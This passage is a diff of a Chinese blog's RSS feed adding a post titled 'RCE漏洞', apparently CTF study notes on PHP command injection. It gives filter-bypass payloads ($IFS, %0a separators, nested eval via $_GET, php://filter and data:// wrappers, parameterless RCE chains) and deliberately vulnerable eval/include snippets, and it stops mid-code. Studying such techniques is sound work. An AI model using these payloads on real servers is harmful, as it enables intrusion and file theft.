-/dev/null 2&amp;gt;&amp;amp;1 主要意思是不进行回显，让命令回显，我们进行命令分隔&lt;br&gt;
-输出黑洞&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1：&amp;gt; 代表重定向到哪里，例如：echo “123” &amp;gt; /home/123.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2：/dev/null 代表空设备文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3：2&amp;gt; 表示stderr标准错误&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4：&amp;amp; 表示等同于的意思，2&amp;gt;&amp;amp;1，表示2的输出重定向等同于1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5：1 表示stdout标准输出，系统默认值是1，所以&amp;quot;&amp;gt;/dev/null&amp;quot;等同于 “1&amp;gt;/dev/null”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;因此，&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 也可以写成“1&amp;gt; /dev/null 2&amp;gt; &amp;amp;1”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;ul&gt;
-&lt;li&gt;为了不让后面的重定向符号执行，就需要把后面截断像 ``;,%0a,%26 以及 ||` 这类都可以&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=tac flag.php;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=cat flag.php%0a(flag.php前面不能加/)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=tac fla*%0a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;这个也可以用通配符 *&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">https://starofeden.github.io/2023/10/28/phpCVE/</guid>
             <title>phpCVE</title>
             <link>https://starofeden.github.io/2023/10/28/phpCVE/</link>
@@ -708,6 +568,145 @@ post：passwd[]=2&lt;/li&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;/section&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://starofeden.github.io/2023/10/28/RCE/</guid>
+            <title>RCE漏洞</title>
+            <link>https://starofeden.github.io/2023/10/28/RCE/</link>
+            <pubDate>Sat, 28 Oct 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;(remote command/code execute) 远程系统命令执行&lt;br&gt;
+&lt;strong&gt;命令执行，需要严格的过滤&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;系统命令执行函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统命令执行函数&#34;&gt;#&lt;/a&gt; 系统命令执行函数：&lt;/h2&gt;
+&lt;p&gt;system ()：能将字符串作为 OS 命令执行，且返回命令执行结果；&lt;br&gt;
+exec ()：能将字符串作为 OS 命令执行，但是只返回执行结果的最后一行 (约等于无回显)；&lt;br&gt;
+shell_exec ()：能将字符串作为 OS 命令执行&lt;br&gt;
+ passthru ()：能将字符串作为 OS 命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；&lt;br&gt;
+popen ()：打开进程文件指针&lt;br&gt;
+ proc_open ()：与 popen () 类似&lt;br&gt;
+ pcntl_exec ()：在当前进程空间执行指定程序；&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;反引号 &lt;code&gt;：反引号&lt;/code&gt; 内的字符串会被解析为 OS 命令；但是反引号不会给出输出结果，得加个 echo：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=echo%20`tac%20f*`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;代码执行函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码执行函数&#34;&gt;#&lt;/a&gt; 代码执行函数&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eval()：将字符串作为php代码执行；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert()：将字符串作为php代码执行；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;preg_replace()：正则匹配替换字符串；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create_function()：主要创建匿名函数；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤&#34;&gt;#&lt;/a&gt; 过滤&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;会返回一个空页面，因为 PHP 是服务器端解释的语言，在浏览网页的时候服务器会对 php 文件进行解释并执行，最终生成相应的 HTML 代码并返回给浏览器，所以网页是显示不出 PHP 代码。查看源代码就能看到 flag&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;linux通配符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux通配符&#34;&gt;#&lt;/a&gt; linux 通配符&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;*&lt;/td&gt;
+&lt;td&gt;匹配任意字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;？&lt;/td&gt;
+&lt;td&gt;匹配任意一个字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;[abcd]&lt;/td&gt;
+&lt;td&gt;匹配 abcd 中任何一个字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;[a-z]&lt;/td&gt;
+&lt;td&gt;表示范围 a 到 z，表示范围的意思 [] 匹配中括号中任意一个字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;[!abcd] 或 [^abcd]&lt;/td&gt;
+&lt;td&gt;表示不匹配括号里面的任何一个字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;常用命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用命令&#34;&gt;#&lt;/a&gt; 常用命令&lt;/h3&gt;
+&lt;p&gt;cat  查看当前文件夹下的文件&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;跟 cat 作用差不多的命令：&lt;br&gt;
+cat、tac、more、less、head、tail、nl、sed、sort、uniq、re&lt;br&gt;
+cp 复制文件&lt;br&gt;
+ nl  打印内容的同时添加行号&lt;br&gt;
+ tac 从尾部向头部逐行打印输出&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;过滤了flag&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了flag&#34;&gt;#&lt;/a&gt; 过滤了 flag&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=system(&amp;#x27;cat f*&amp;#x27;); //这个需要访问源代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=system(&amp;quot;cp fla?.php 1.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=system(“cat *php &amp;gt;&amp;gt; 1.txt”);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;过滤了空格&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了空格&#34;&gt;#&lt;/a&gt; 过滤了空格&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;（反引号）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;IFS&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$IFS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%09（tab）（php环境）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;在使用 `` 或者 system 这些命令，带有的内容替换时，要注意转义（加上\），因为在 php 中有特殊含义&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;测试时发现 %20 和 $IFS ${IFS} 都不行。因为用 $IFS 的话，会认为解析没结束，会把后面的也当做参数解析，而 $IFS$9 的话，结束了 $IFS 后加上了一个不存在或者说空字符串的变量。所以解析为空，但结束了 $IFS，正常执行后面的内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;嵌套执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#嵌套执行&#34;&gt;#&lt;/a&gt; 嵌套执行&lt;/h3&gt;
+&lt;p&gt;常与正则匹配一起出现 (因为正则匹配只对 c 进行了匹配)&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload：?c=eval($_GET[1]);&amp;amp;1=system(&amp;quot;tac flag.php&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;过滤了分号反引号左括号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤了分号反引号左括号&#34;&gt;#&lt;/a&gt; 过滤了分号，反引号，左括号&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $c = $_GET[&amp;#x27;c&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(!preg_match(&amp;quot;/flag|system|php|cat|sort|shell|\.| |\&amp;#x27;|\`|echo|\;|\(/i&amp;quot;, $c))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        eval($c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;php 伪协议&lt;/li&gt;
+&lt;li&gt;在 eval 中可以用？&amp;gt; 代替；因为在 eval 中每个语句都要加分好&lt;br&gt;
+&lt;strong&gt; GET 一定要大写&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;参数可以用数字或字母，被过滤了就只能用字母了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c=include$_GET[a]?&amp;gt;&amp;amp;a=php://filter/read=convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;意思是先把 include$_GET [1]?&amp;gt; 传入 c，就实现了可通过 get 方式获取到 l 并且 include 进来。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;data协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#data协议&#34;&gt;#&lt;/a&gt; data 协议&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; if(!preg_match(&amp;quot;/flag/i&amp;quot;, $c))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        include($c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;包含了 c，也就是说把 c 传入一个获取 flag 的文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//编码是&amp;lt;?php system(&amp;#x27;cat flag.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//或者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?c=data://text/plain,&amp;lt;?php system(&amp;#x27;cat fla*&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;如果增加了.php 后缀也可以用这个 playload，因为语句已经闭合了，后面的.php 会被当成 html 页面直接显示在页面上。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;直接cat不echo的话是看不到flag的，所以没有echo的话必须用下面的playload&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=data://text/plain,&amp;lt;?=system(&amp;#x27;tac fl*&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;“&amp;lt;?=” 是 PHP 的一个短的开放式标签，是 echo () 的快捷用法&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;无参数rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无参数rce&#34;&gt;#&lt;/a&gt; 无参数 RCE&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;正则校验:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(&amp;#x27;;&amp;#x27; === preg_replace(&amp;#x27;/[^\W]+\((?R)?\)/&amp;#x27;, &amp;#x27;&amp;#x27;, $_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval($_GET[&amp;#x27;code&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;只能以下形式通过：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a(b(c()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;大致思路如下：&lt;br&gt;
+1. 利用超全局变量进行 bypass，进行 RCE&lt;br&gt;
+2. 进行任意文件读取&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. pos()：返回数组中当前元素的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. scandir()：获取目录下的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4. array_reverse()：将数组逆序排列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5. next()：函数将内部指针指向下一元素，并输出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6. show_source()函数对文件进行语法高亮显示，是highlight_file()别名。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7. print_r(scandir(‘.’)); 查看当前目录下的所有文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8. current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;array_reverse() 函数以相反的元素顺序返回数组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;next() 函数将内部指针指向数组中的下一个元素，并输出。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。同时整个文件也会显示出来&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//构造如下payload：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highlight_file(next(array_reverse((scandir(pos(localeconv()))))));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//上述先用第一个函数将数组元素顺序颠倒，随后用next函数，将指针指向flag的位置，最终用高亮显示，将了flag文件回显&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pos()与current()作用相同 readfile()与作用相同highlight_file()&lt;/span&gt;&lt;br&gt;&lt;span 